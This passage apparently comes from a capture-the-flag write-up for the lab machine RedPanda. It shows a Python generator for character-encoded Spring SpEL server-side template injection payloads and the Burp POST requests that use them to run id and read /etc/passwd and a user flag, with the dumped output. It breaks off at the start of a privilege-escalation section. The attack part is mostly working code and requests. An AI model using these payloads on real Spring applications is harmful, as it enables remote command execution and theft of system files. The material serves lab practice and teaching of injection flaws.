</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>parser <span style=color:#f92672>=</span> argparse<span style=color:#f92672>.</span>ArgumentParser(description<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Generate SSTI payloads... One character at a time.&#34;</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;-u&#34;</span>,<span style=color:#e6db74>&#34;--url-encode&#34;</span>, action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store_true&#34;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;URL Encode&#34;</span>)
</span></span><span style=display:flex><span>args <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url_encode<span style=color:#f92672>=</span>args<span style=color:#f92672>.</span>url_encode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Terminal</span>(Cmd):
</span></span><span style=display:flex><span>	prompt<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[1;33mCommand ==&gt;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m &#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decimal_encode</span>(self,args):
</span></span><span style=display:flex><span>		command<span style=color:#f92672>=</span>args
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		decimals<span style=color:#f92672>=</span>[]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> command:
</span></span><span style=display:flex><span>			decimals<span style=color:#f92672>.</span>append(str(ord(i)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;&#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>)&#39;&#39;&#39;</span> <span style=color:#f92672>%</span> decimals[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>		
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> decimals[<span style=color:#ae81ff>1</span>:]:
</span></span><span style=display:flex><span>			line<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;.concat(T(java.lang.Character).toString(</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>))&#39;</span><span style=color:#f92672>.</span>format(i)
</span></span><span style=display:flex><span>			payload<span style=color:#f92672>+=</span>line
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>+=</span><span style=color:#e6db74>&#39;).getInputStream())}&#39;</span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> url_encode:
</span></span><span style=display:flex><span>			payload_encoded<span style=color:#f92672>=</span>urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote_plus(payload,safe<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> payload_encoded
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> payload
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>default</span>(self,args):
</span></span><span style=display:flex><span>		print(self<span style=color:#f92672>.</span>decimal_encode(args))
</span></span><span style=display:flex><span>		print()
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>	term<span style=color:#f92672>=</span>Terminal()
</span></span><span style=display:flex><span>	term<span style=color:#f92672>.</span>cmdloop()
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
</span></span><span style=display:flex><span>	quit()
</span></span></code></pre></div><p>python3
id</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>${T(org.<span style=color:#a6e22e>apache</span>.<span style=color:#a6e22e>commons</span>.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>IOUtils</span>).<span style=color:#a6e22e>toString</span>(T(java.<span style=color:#a6e22e>lang</span>.<span style=color:#a6e22e>Runtime</span>).<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(T(java.<span style=color:#a6e22e>lang</span>.<span style=color:#a6e22e>Character</span>).<span style=color:#a6e22e>toString</span>(105).<span style=color:#a6e22e>concat</span>(T(java.<span style=color:#a6e22e>lang</span>.<span style=color:#a6e22e>Character</span>).<span style=color:#a6e22e>toString</span>(100))).<span style=color:#a6e22e>getInputStream</span>())}
</span></span></code></pre></div><p>burp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /search HTTP/1.1
</span></span><span style=display:flex><span>Host: redpanda.htb:8080
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>189</span>
</span></span><span style=display:flex><span>Origin: http://redpanda.htb:8080
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://redpanda.htb:8080/
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>name<span style=color:#f92672>=</span>*<span style=color:#f92672>{</span>T<span style=color:#f92672>(</span>org.apache.commons.io.IOUtils<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Runtime<span style=color:#f92672>)</span>.getRuntime<span style=color:#f92672>()</span>.exec<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>105<span style=color:#f92672>)</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>100<span style=color:#f92672>)))</span>.getInputStream<span style=color:#f92672>())}</span>
</span></span></code></pre></div><p>cat /etc/passwd</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>${</span>T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())<span style=color:#e6db74>}</span>
</span></span></code></pre></div><p>burp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /search HTTP/1.1
</span></span><span style=display:flex><span>Host: redpanda.htb:8080
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>767</span>
</span></span><span style=display:flex><span>Origin: http://redpanda.htb:8080
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://redpanda.htb:8080/
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>name<span style=color:#f92672>=</span>*<span style=color:#f92672>{</span>T<span style=color:#f92672>(</span>org.apache.commons.io.IOUtils<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Runtime<span style=color:#f92672>)</span>.getRuntime<span style=color:#f92672>()</span>.exec<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>99<span style=color:#f92672>)</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>97<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>116<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>32<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>47<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>101<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>116<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>99<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>47<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>112<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>97<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>115<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>115<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>119<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>100<span style=color:#f92672>)))</span>.getInputStream<span style=color:#f92672>())}</span>
</span></span></code></pre></div><p>etc/passwd</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style=display:flex><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style=display:flex><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style=display:flex><span>woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
</span></span><span style=display:flex><span>mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
</span></span></code></pre></div><p><code>woodenk</code></p><p>cat /home/woodenk/user.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>${</span>T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())<span style=color:#e6db74>}</span>
</span></span></code></pre></div><p>burp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /search HTTP/1.1
</span></span><span style=display:flex><span>Host: redpanda.htb:8080
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>1262</span>
</span></span><span style=display:flex><span>Origin: http://redpanda.htb:8080
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://redpanda.htb:8080/
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>name<span style=color:#f92672>=</span>*<span style=color:#f92672>{</span>T<span style=color:#f92672>(</span>org.apache.commons.io.IOUtils<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Runtime<span style=color:#f92672>)</span>.getRuntime<span style=color:#f92672>()</span>.exec<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>99<span style=color:#f92672>)</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>97<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>116<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>32<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>47<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>104<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>111<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>109<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>101<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>47<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>119<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>111<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>111<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>100<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>101<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>110<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>107<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>47<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>117<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>115<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>101<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>114<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>46<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>116<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>120<span style=color:#f92672>))</span>.concat<span style=color:#f92672>(</span>T<span style=color:#f92672>(</span>java.lang.Character<span style=color:#f92672>)</span>.toString<span style=color:#f92672>(</span>116<span style=color:#f92672>)))</span>.getInputStream<span style=color:#f92672>())}</span>
</span></span></code></pre></div><p>user.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>1ba32ec**********
</span></span></code></pre></div><h3 id=5-privilege-escalation>5. Privilege escalation<a hidden class=anchor aria-hidden=true href=#5-privilege-escalation>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.util.ArrayList;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.sql.*;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.List;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.ArrayList;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.stereotype.Controller;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.ui.Model;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.GetMapping;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.PostMapping;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.RequestParam;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.RestController;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.ResponseBody;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.servlet.ModelAndView;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.http.MediaType;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.io.IOUtils;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.jdom2.JDOMException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.jdom2.input.SAXBuilder;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.jdom2.output.Format;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.jdom2.output.XMLOutputter;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.jdom2.*;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@Controller</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MainController</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>@GetMapping</span>(<span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>/</span>stats<span style=color:#f92672>&amp;</span>quot;)
</span></span><span style=display:flex><span>  	<span style=color:#66d9ef>public</span> ModelAndView <span style=color:#a6e22e>stats</span>(<span style=color:#a6e22e>@RequestParam</span>(name<span style=color:#f92672>=&amp;</span>quot;author<span style=color:#f92672>&amp;</span>quot;,required<span style=color:#f92672>=</span><span style=color:#66d9ef>false</span>) String author, Model model) <span style=color:#66d9ef>throws</span> JDOMException, IOException{
</span></span><span style=display:flex><span>		SAXBuilder saxBuilder <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SAXBuilder();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(author <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>		author <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>quot;N<span style=color:#f92672>/</span>A<span style=color:#f92672>&amp;</span>quot;;
</span></span><span style=display:flex><span>		author <span style=color:#f92672>=</span> author.<span style=color:#a6e22e>strip</span>();
</span></span><span style=display:flex><span>		System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span>39;<span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span>39; <span style=color:#f92672>+</span> author <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span>39;<span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span>39;);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(author.<span style=color:#a6e22e>equals</span>(<span style=color:#f92672>&amp;</span>quot;woodenk<span style=color:#f92672>&amp;</span>quot;) <span style=color:#f92672>||</span> author.<span style=color:#a6e22e>equals</span>(<span style=color:#f92672>&amp;</span>quot;damian<span style=color:#f92672>&amp;</span>quot;))
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			String path <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>/</span>credits<span style=color:#f92672>/&amp;</span>quot; <span style=color:#f92672>+</span> author <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span>quot;_creds.<span style=color:#a6e22e>xml</span><span style=color:#f92672>&amp;</span>quot;;
</span></span><span style=display:flex><span>			File fd <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(path);
</span></span><span style=display:flex><span>			Document doc <span style=color:#f92672>=</span> saxBuilder.<span style=color:#a6e22e>build</span>(fd);
</span></span><span style=display:flex><span>			Element rootElement <span style=color:#f92672>=</span> doc.<span style=color:#a6e22e>getRootElement</span>();
</span></span><span style=display:flex><span>			String totalviews <span style=color:#f92672>=</span> rootElement.<span style=color:#a6e22e>getChildText</span>(<span style=color:#f92672>&amp;</span>quot;totalviews<span style=color:#f92672>&amp;</span>quot;);
